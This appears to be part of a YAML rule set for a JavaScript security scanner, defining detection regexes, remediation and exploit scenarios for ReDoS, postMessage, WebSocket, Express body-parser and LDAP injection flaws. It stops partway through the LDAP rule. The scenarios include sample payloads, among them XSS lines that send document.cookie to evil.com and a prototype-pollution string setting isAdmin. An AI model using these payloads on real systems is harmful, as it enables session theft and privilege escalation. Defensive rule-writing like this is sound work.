  # ==========================================================================
  # JS-INJ-011: RegExp Constructor ReDoS Injection
  # ==========================================================================
  - rule_id: JS-INJ-011
    title: RegExp Constructor ReDoS Injection
    description: >
      Detects usage of the RegExp constructor with user-controlled patterns,
      enabling Regular Expression Denial of Service (ReDoS) attacks. Attackers
      can craft patterns with exponential backtracking complexity.
    language: javascript
    category: injection
    severity: Medium
    confidence: 0.87
    cwe: CWE-1333
    owasp: "A03:2021-Injection"
    tags: [redos, regex-injection, dos, javascript]
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'new\s+RegExp\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|search|pattern|filter)'
        description: "RegExp constructor with user-controlled pattern"
      - type: regex
        pattern: 'new\s+RegExp\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|search|pattern)[^}]*\}'
        description: "RegExp with template literal user input"
      - type: regex
        pattern: 'new\s+RegExp\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|search|pattern)'
        description: "RegExp with concatenated user input"
      - type: regex
        pattern: '\.match\s*\(\s*new\s+RegExp\s*\(\s*(?:req|input|user|search|query)'
        description: "String.match with user-controlled RegExp"
    anti_patterns:
      - 'new\s+RegExp\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
      - 'escapeRegExp'
      - 'escape-string-regexp'
      - 'lodash\.escapeRegExp'
      - 'test\s*\('
      - 'safe-regex'
    bypass_variants:
      - description: "Catastrophic backtracking pattern"
        pattern: '\(a+\)\+'
      - description: "Nested quantifiers"
        pattern: '\([^)]*[+*]\s*\)[+*]'
    evasion_indicators:
      - "User-controlled regex with nested quantifiers"
      - "Exponential backtracking patterns"
    encoding_variants:
      - type: "unicode"
        pattern: '\\u[0-9a-fA-F]{4}'
    multi_function_chain_patterns:
      - "req.query.search -> new RegExp(search) -> str.match(regex)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "ReDoS causes CPU exhaustion and application denial of service"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: false
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.query.search"
        sink: "new RegExp()"
        through: "direct parameter pass"
    impact: |
      ReDoS attacks cause CPU exhaustion, making the application unresponsive.
      Attackers can craft patterns that take exponential time to evaluate.
    remediation: |
      - Escape user input with escapeRegExp before using in RegExp constructor.
      - Use re2 library for safe regex evaluation.
      - Set timeouts on regex operations.
      - Use safe-regex to validate patterns before execution.
    references:
      - "https://cwe.mitre.org/data/definitions/1333.html"
    context_awareness:
      surrounding_context_patterns: ['\.match\s*\(', '\.test\s*\(', '\.replace\s*\(']
      taint_source_indicators: ['req\.query\.search', 'req\.body\.pattern']
      taint_sink_indicators: ['new\s+RegExp', '\.match\s*\(', '\.test\s*\(']
      sanitization_patterns: ['escapeRegExp', 'escape-string-regexp', 'safe-regex']
    severity_scoring:
      severity_weight: 6
      risk_score_formula_hint: "severity_weight * confidence * pattern_complexity"
      exploitability_score: "Medium"
    exploit_scenario:
      attack_example: |
        A search API uses new RegExp(req.query.q) to filter results. Attacker
        sends q=(a+)+$ with a long input to cause catastrophic backtracking.
      example_payload: "(a+)+$"
      attacker_objective: "Cause denial of service via regex CPU exhaustion"
    confidence_factors:
      pattern_strength: "high"
      context_match: "medium"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: false
      requires_ai_validation: true
      high_impact_flag: false
      related_rules: [JS-INJ-010]

  # ==========================================================================
  # JS-INJ-012: postMessage Origin Bypass
  # ==========================================================================
  - rule_id: JS-INJ-012
    title: postMessage Origin Bypass Injection
    description: >
      Detects insecure postMessage handling where the origin of incoming
      messages is not validated, allowing cross-origin attackers to inject
      malicious data or trigger unauthorized actions.
    language: javascript
    category: injection
    severity: High
    confidence: 0.86
    cwe: CWE-346
    owasp: "A03:2021-Injection"
    tags: [postmessage, origin-bypass, cross-origin, xss, javascript]
    detection_layer: 3
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'addEventListener\s*\(\s*[\x27"]message[\x27"]\s*,\s*(?:function|(?:\w+|\([^)]*\))\s*=>)\s*(?:\{|\()'
        description: "Message event listener without origin check"
      - type: regex
        pattern: 'onmessage\s*=\s*(?:function|(?:\w+|\([^)]*\))\s*=>)'
        description: "onmessage handler assignment"
      - type: regex
        pattern: '\.postMessage\s*\(\s*[^,]+,\s*[\x27"]\*[\x27"]\s*\)'
        description: "postMessage with wildcard target origin"
      - type: regex
        pattern: 'event\.data(?!\s*&&\s*event\.origin)'
        description: "Using event.data without prior origin check"
    anti_patterns:
      - 'event\.origin\s*(?:===|!==|==|!=)'
      - 'if\s*\(\s*(?:e|event|msg)\.origin'
      - 'allowedOrigins'
      - 'trustedOrigins'
      - 'ALLOWED_ORIGINS'
      - 'test\s*\('
    bypass_variants:
      - description: "Postmessage via null origin sandbox"
        pattern: 'sandbox\s*=\s*[\x27"]allow-scripts[\x27"]'
      - description: "Origin check bypass via data: scheme"
        pattern: 'origin\s*===\s*[\x27"]null[\x27"]'
    evasion_indicators:
      - "Sandboxed iframe with null origin"
      - "data: URI origin bypass"
    encoding_variants:
      - type: "json_injection"
        pattern: 'JSON\.parse\s*\(\s*(?:e|event)\.data\s*\)'
    multi_function_chain_patterns:
      - "window.postMessage(payload, '*') -> event.data -> eval/innerHTML"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Cross-origin message injection enables XSS and action forgery"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "event.data (postMessage)"
        sink: "innerHTML, eval, or DOM manipulation"
        through: "missing origin validation"
    impact: |
      Missing postMessage origin validation allows cross-origin attackers to
      inject data, trigger XSS, forge actions, and steal sensitive information.
    remediation: |
      - Always validate event.origin against a strict allowlist.
      - Never use '*' as the target origin in postMessage().
      - Validate and sanitize event.data before processing.
    references:
      - "https://cwe.mitre.org/data/definitions/346.html"
      - "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
    context_awareness:
      surrounding_context_patterns: ['addEventListener', 'postMessage', 'window\.']
      taint_source_indicators: ['event\.data', 'e\.data', 'msg\.data']
      taint_sink_indicators: ['innerHTML', 'eval', 'document\.write']
      sanitization_patterns: ['event\.origin', 'allowedOrigins', 'origin\s*===']
    severity_scoring:
      severity_weight: 7
      risk_score_formula_hint: "severity_weight * confidence * (1 - origin_check)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A widget handles postMessage events without origin checks and uses
        event.data to update innerHTML. An attacker hosts a page that sends
        malicious postMessage with XSS payload to the widget iframe.
      example_payload: '<img src=x onerror="alert(document.cookie)">'
      attacker_objective: "Inject malicious data via cross-origin postMessage"
    confidence_factors:
      pattern_strength: "medium"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-001, JS-INJ-013]

  # ==========================================================================
  # JS-INJ-013: WebSocket Message Injection
  # ==========================================================================
  - rule_id: JS-INJ-013
    title: WebSocket Message Injection
    description: >
      Detects insecure handling of WebSocket messages where incoming data is
      used without validation in security-sensitive operations like eval,
      innerHTML, or database queries.
    language: javascript
    category: injection
    severity: High
    confidence: 0.85
    cwe: CWE-94
    owasp: "A03:2021-Injection"
    tags: [websocket, message-injection, real-time, javascript]
    detection_layer: 3
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'ws\.on\s*\(\s*[\x27"]message[\x27"]\s*,\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:eval|innerHTML|exec|query)\s*'
        description: "WebSocket message handler with dangerous sink"
      - type: regex
        pattern: '\.onmessage\s*=\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:eval|innerHTML|document\.write)'
        description: "WebSocket onmessage with XSS/eval sink"
      - type: regex
        pattern: 'socket\.on\s*\(\s*[\x27"]\w+[\x27"]\s*,\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:exec|query|eval)'
        description: "Socket.io event handler with dangerous operation"
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*(?:msg|message|data|event\.data)\s*\)[^;]*(?:eval|exec|query|innerHTML)'
        description: "Parsed WebSocket message used in dangerous sink"
    anti_patterns:
      - 'validate\s*\('
      - 'sanitize\s*\('
      - 'schema\s*\.\s*validate'
      - 'Joi\.'
      - 'test\s*\('
      - 'JSON\.parse.*try.*catch'
    bypass_variants:
      - description: "Binary WebSocket message injection"
        pattern: 'ws\.binaryType\s*=\s*[\x27"]arraybuffer[\x27"]'
      - description: "Multiple event handler injection"
        pattern: 'socket\.on\s*\(\s*[^)]+\)\s*;?\s*socket\.on'
    evasion_indicators:
      - "Binary data in WebSocket messages"
      - "Race condition in multi-message protocols"
    encoding_variants:
      - type: "json_injection"
        pattern: 'JSON\.parse\s*\(\s*message\s*\)'
    multi_function_chain_patterns:
      - "WebSocket message -> JSON.parse -> eval(msg.code)"
      - "Socket.io event -> message.data -> db.query()"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "WebSocket injection enables real-time code execution and data theft"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "WebSocket message data"
        sink: "eval(), innerHTML, db.query()"
        through: "JSON.parse and direct usage"
    impact: |
      WebSocket message injection can lead to code execution, XSS, SQL
      injection, and unauthorized data manipulation in real-time applications.
    remediation: |
      - Validate and sanitize all WebSocket message data.
      - Use schema validation (Joi, ajv) for message formats.
      - Never use eval() or innerHTML with WebSocket data.
      - Implement message authentication (HMAC signatures).
    references:
      - "https://cwe.mitre.org/data/definitions/94.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ws[\x27"]\s*\)', 'require\s*\(\s*[\x27"]socket\.io[\x27"]\s*\)']
      taint_source_indicators: ['msg', 'message', 'data', 'event\.data']
      taint_sink_indicators: ['eval\s*\(', 'innerHTML', '\.query\s*\(', 'exec']
      sanitization_patterns: ['validate', 'Joi\.', 'schema\.validate', 'sanitize']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - validation_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A chat app renders WebSocket messages via element.innerHTML = msg.content.
        Attacker sends a message containing <script>document.location='https://evil.com/'+document.cookie</script>.
      example_payload: '<img src=x onerror="fetch(`https://evil.com/?c=${document.cookie}`)">'
      attacker_objective: "Inject malicious content via WebSocket messages"
    confidence_factors:
      pattern_strength: "medium"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-001, JS-INJ-012]

  # ==========================================================================
  # JS-INJ-014: Express Body Parser Injection
  # ==========================================================================
  - rule_id: JS-INJ-014
    title: Express Middleware Body Parser Injection
    description: >
      Detects insecure Express.js middleware configurations that allow
      body parser type confusion attacks, enabling attackers to send
      unexpected content types that bypass validation logic.
    language: javascript
    category: injection
    severity: Medium
    confidence: 0.84
    cwe: CWE-20
    owasp: "A03:2021-Injection"
    tags: [express, body-parser, type-confusion, middleware, content-type]
    detection_layer: 4
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'app\.use\s*\(\s*(?:express\.json|bodyParser\.json)\s*\(\s*\{[^}]*(?:strict\s*:\s*false|type\s*:\s*[\x27"]\*)'
        description: "JSON body parser with relaxed strict or type settings"
      - type: regex
        pattern: 'app\.use\s*\(\s*(?:express\.urlencoded|bodyParser\.urlencoded)\s*\(\s*\{[^}]*extended\s*:\s*true'
        description: "URL-encoded parser with extended mode allowing nested objects"
      - type: regex
        pattern: 'app\.use\s*\(\s*(?:express\.raw|bodyParser\.raw)\s*\(\s*\{[^}]*type\s*:\s*[\x27"]\*'
        description: "Raw body parser accepting all content types"
      - type: regex
        pattern: 'bodyParser\.text\s*\(\s*\{[^}]*type\s*:\s*[\x27"]\*/\*'
        description: "Text body parser accepting all MIME types"
    anti_patterns:
      - 'extended\s*:\s*false'
      - 'strict\s*:\s*true'
      - 'type\s*:\s*[\x27"]application/json[\x27"]'
      - 'helmet\s*\('
      - 'test\s*\('
      - 'content-type.*validation'
    bypass_variants:
      - description: "Content-Type mismatch attack"
        pattern: 'Content-Type:\s*(?:text/plain|application/x-www-form-urlencoded).*\{'
      - description: "HPP via extended urlencoded"
        pattern: 'extended\s*:\s*true.*\w+\[__proto__\]'
    evasion_indicators:
      - "Content-Type header manipulation"
      - "Nested object injection via extended urlencoded"
    encoding_variants:
      - type: "content_type_confusion"
        pattern: 'Content-Type:\s*(?!application/json)'
    multi_function_chain_patterns:
      - "bodyParser.urlencoded({extended:true}) -> req.body -> prototype pollution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Body parser misconfiguration enables type confusion and prototype pollution"
    business_logic_indicator:
      financial_impact: false
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HTTP request body"
        sink: "req.body"
        through: "body parser with extended:true or relaxed type"
    impact: |
      Insecure body parser configuration enables type confusion attacks,
      prototype pollution via extended urlencoded, and content-type bypass.
    remediation: |
      - Use extended: false for urlencoded parser.
      - Set explicit content type restrictions.
      - Validate req.body types explicitly in route handlers.
      - Use express-mongo-sanitize to prevent operator injection.
    references:
      - "https://expressjs.com/en/api.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]express[\x27"]\s*\)', 'app\.use']
      taint_source_indicators: ['req\.body']
      taint_sink_indicators: ['\.find\s*\(', 'Object\.assign', '\.merge\s*\(']
      sanitization_patterns: ['extended.*false', 'express-mongo-sanitize', 'type.*application/json']
    severity_scoring:
      severity_weight: 6
      risk_score_formula_hint: "severity_weight * confidence * (1 - config_hardening)"
      exploitability_score: "Medium"
    exploit_scenario:
      attack_example: |
        An Express app uses bodyParser.urlencoded({extended:true}). An attacker
        sends user[__proto__][isAdmin]=true in the URL-encoded body to pollute
        Object.prototype and gain admin access.
      example_payload: "user[__proto__][isAdmin]=true&user[__proto__][role]=admin"
      attacker_objective: "Exploit body parser configuration for prototype pollution or type confusion"
    confidence_factors:
      pattern_strength: "medium"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "medium"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: false
      related_rules: [JS-INJ-008, JS-INJ-010]

  # ==========================================================================
  # JS-INJ-015: LDAP Injection via ldapjs
  # ==========================================================================
  - rule_id: JS-INJ-015
    title: LDAP Injection via ldapjs
    description: >
      Detects LDAP injection vulnerabilities in Node.js applications using
      ldapjs or similar LDAP client libraries where user-controlled input is
      interpolated into LDAP filter strings without sanitization.
    language: javascript
    category: injection
    severity: High
    confidence: 0.89
    cwe: CWE-90
    owasp: "A03:2021-Injection"
    tags: [ldap-injection, ldapjs, directory-service, authentication-bypass]
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '\.search\s*\(\s*[^,]+,\s*\{[^}]*filter\s*:\s*[`][^`]*\$\{[^}]*(?:req|input|user|username|name)[^}]*\}'
        description: "LDAP search with template literal filter containing user input"
      - type: regex
        pattern: '\.search\s*\(\s*[^,]+,\s*\{[^}]*filter\s*:\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|username)'
        description: "LDAP search with concatenated filter"
      - type: regex
        pattern: 'ldap\.(?:search|bind|modify|compare)\s*\(\s*[^,]*(?:req\.|input|user|username|dn)\.'
        description: "LDAP operation with user-controlled DN or filter"
      - type: regex
        pattern: '(?:parseDN|parseFilter)\s*\(\s*(?:req\.|input|user|username)'
        description: "LDAP DN/filter parsing with user input"
    anti_patterns:
      - 'ldap\.escape\s*\('
      - 'escapeLDAPFilter\s*\('
      - 'sanitize\s*\('
      - 'Filter\.(?:EqualityFilter|SubstringFilter|PresenceFilter)'
      - 'test\s*\('
      - 'ldap\.parseFilter\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
    bypass_variants:
      - description: "LDAP filter injection via wildcard"
        pattern: '\*\)\(\|?\(\w+=\*'
      - description: "LDAP injection with OR operator"
        pattern: '\)\(|\|?\(\w+=\*\)'
    evasion_indicators:
      - "LDAP metacharacter injection (*, (), |, &)"
      - "DN injection via unescaped commas"
    encoding_variants:
      - type: "hex_ldap"
        pattern: '\\[0-9a-fA-F]{2}'
    multi_function_chain_patterns:
      - "req.body.username -> filter: `(uid=${username})` -> ldap.search"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "LDAP injection enables authentication bypass and directory data exfiltration"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body.username"
        sink: "ldap.search(filter)"
        through: "template literal or string concatenation"
    impact: |
      LDAP injection allows attackers to bypass authentication, enumerate
      directory users, extract sensitive attributes, and modify directory entries.
    remediation: |
      - Use LDAP filter escaping functions for user input.
      - Use ldapjs Filter objects instead of string filters.
      - Validate input against strict character allowlists.
      - Use parameterized LDAP queries where available.
    references:
      - "https://cwe.mitre.org/data/definitions/90.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ldapjs[\x27"]\s*\)', 'createClient']
      taint_source_indicators: ['req\.body\.username', 'req\.body\.password', 'req\.query\.user']
      taint_sink_indicators: ['\.search\s*\(', '\.bind\s*\(', 'filter\s*:']
      sanitization_patterns: ['ldap\.escape', 'escapeLDAPFilter', 'Filter\.EqualityFilter']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
